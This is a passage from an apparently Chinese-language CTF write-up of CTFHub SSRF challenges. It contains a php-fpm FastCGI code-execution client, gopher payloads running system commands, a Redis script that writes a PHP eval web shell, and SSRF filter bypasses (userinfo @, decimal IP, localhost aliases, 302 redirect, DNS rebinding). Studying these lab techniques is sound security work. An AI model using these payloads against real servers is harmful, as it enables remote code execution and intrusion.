    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>__connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connect failure! please check your fasctcgi-server !!'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        request <span class="token operator">=</span> <span class="token string">b""</span>
        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \
                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \
                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \
                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>
        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>
                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        paramsRecord <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                name <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
                paramsRecord <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>

        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>
            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>

        <span class="token keyword">if</span> post<span class="token punctuation">:</span>
            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SEND
        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__waitForResponse<span class="token punctuation">(</span>requestId<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            data <span class="token operator">+=</span> buf

        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> response<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \
                    <span class="token keyword">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>
                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR
                <span class="token keyword">if</span> requestId <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>

    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'&lt;?php phpinfo(); exit; ?>'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>
    uri <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token builtin">file</span>
    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>
        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>
        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>
        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>
        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>
        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>
        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>
        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>
    <span class="token punctuation">&#125;</span>
    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>force_text<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>找flag：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python .<span class="token punctuation">\</span>fpm.py <span class="token string">"172.22.73.110"</span> <span class="token string">"/var/www/html/index.php"</span> -c <span class="token string">"&lt;?php system('ls;ls /'); exit; ?>"</span> -p <span class="token number">2333</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707200642461.png" alt loading="lazy"></p>
<p>wsl上监听2333端口用来接收flag，并将结果保存到<code>fcg_exp.txt</code>文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707201353035.png" alt loading="lazy"></p>
<pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%2501%2501%25E7%25F4%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E7%25F4%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI&#x2F;1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250B%2517SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250D%2501DOCUMENT_ROOT&#x2F;%250F%250ESERVER_SOFTWAREphp&#x2F;fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250C%2510CONTENT_TYPEapplication&#x2F;text%250E%2502CONTENT_LENGTH33%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E7%25F4%2500%2500%2500%2500%2501%2505%25E7%25F4%2500%2521%2500%2500%253C%253Fphp%2520system%2528%2527ls%253Bls%2520&#x2F;%2527%2529%253B%2520exit%253B%2520%253F%253E%2501%2505%25E7%25F4%2500%2500%2500%2500</code></pre>

<p>然后再将文件读取出来得到有效的payload直接打</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token punctuation">,</span> unquote<span class="token punctuation">,</span> urlencode
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://challenge-3c0ef6982bf49126.sandbox.ctfhub.com:10800/?url="</span>

<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fcg_exp.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> quote<span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:9000/_"</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span><span class="token string">"%0D"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%2F"</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707200659006.png" alt loading="lazy"></p>
<p>看到flag文件<code>flag_488cfa9618a27d4323c5cf9791dd2bcc</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707202019321.png" alt loading="lazy"></p>
<p>最后直接读文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python .<span class="token punctuation">\</span>fpm.py <span class="token string">"172.22.73.110"</span> <span class="token string">"/var/www/html/index.php"</span> -c <span class="token string">"&lt;?php system('cat \'/flag_488cfa9618a27d4323c5cf9791dd2bcc\''); exit; ?>"</span> -p <span class="token number">2333</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707201211951.png" alt loading="lazy"></p>
<pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%2501%2501%2595%2594%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2595%2594%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI&#x2F;1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250B%2517SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250D%2501DOCUMENT_ROOT&#x2F;%250F%250ESERVER_SOFTWAREphp&#x2F;fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250C%2510CONTENT_TYPEapplication&#x2F;text%250E%2502CONTENT_LENGTH69%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%2595%2594%2500%2500%2500%2500%2501%2505%2595%2594%2500E%2500%2500%253C%253Fphp%2520system%2528%2527find%2520&#x2F;%2520-name%2520%255C%2527%252A%255C%2527%2520%257C%2520xargs%2520grep%2520%255C%2527ctfhub%257B%255C%2527%2527%2529%253B%2520exit%253B%2520%253F%253E%2501%2505%2595%2594%2500%2500%2500%2500</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707201513621.png" alt loading="lazy"></p>
<h3 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h3><p>题目提示<code>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</code></p>
<p>使用脚本生成payload，python2下跑</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">,</span>requests

protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>
port<span class="token operator">=</span><span class="token string">"6379"</span>
shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_POST[\"shell\"]);?>\n\n"</span>
filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
passwd<span class="token operator">=</span><span class="token string">""</span>
cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
     <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"save"</span>
     <span class="token punctuation">]</span>
<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">=</span><span class="token string">""</span>
    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">+=</span>CRLF
    <span class="token keyword">return</span> cmd

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span> result</code></pre>

<pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A6379&#x2F;_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522shell%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A&#x2F;var&#x2F;www&#x2F;html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>

<p>将生成的结果直接传给url，访问</p>
<p>然后访问shell.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707212626096.png" alt loading="lazy"></p>
<p>可以看到成功写入，然后找flag，直接cat即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707212729350.png" alt loading="lazy"></p>
<h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>题目提示<code>请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</code></p>
<p>可以用<code>@</code>绕过，<code>http://whoami@127.0.0.1</code>实际上是以用户名 <code>whoami</code> 连接到站点<code>127.0.0.1</code></p>
<p>payload</p>
<pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708151728102.png" alt loading="lazy"></p>
<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>题目提示<code>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</code></p>
<p>可以用十进制绕过，当然也可以是用八进制或者十六进制，但是都需要用到<code>.</code></p>
<pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708154141264.png" alt loading="lazy"></p>
<p>另外还有一种思路，<code>利用其他各种指向127.0.0.1的地址</code>，学习了</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;
http:&#x2F;&#x2F;0&#x2F;
http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;
http:&#x2F;&#x2F;①②⑦.⓪.⓪.①</code></pre>

<h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>题目提示<code>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</code></p>
<p>还是上面一样的方法直接绕了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708155539943.png" alt loading="lazy"></p>
<p>另外还有一种方法，用短链接，<a href="http://4m.cn">http://4m.cn</a></p>
<h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>题目提示<code>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</code></p>
<p>附件给的链接：<a href="https://zhuanlan.zhihu.com/p/89426041">https://zhuanlan.zhihu.com/p/89426041</a></p>
<p>理解后实践</p>
<p>我们在 <a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a> 这个网站上获取一个测试用的域名，当然这个网站目的就是用来测DNS重绑定漏洞的，拿到生成的域名<code>7f000001.2f6aa0b0.rbndr.us</code></p>
<p>请求，如果是404就按F5刷新</p>
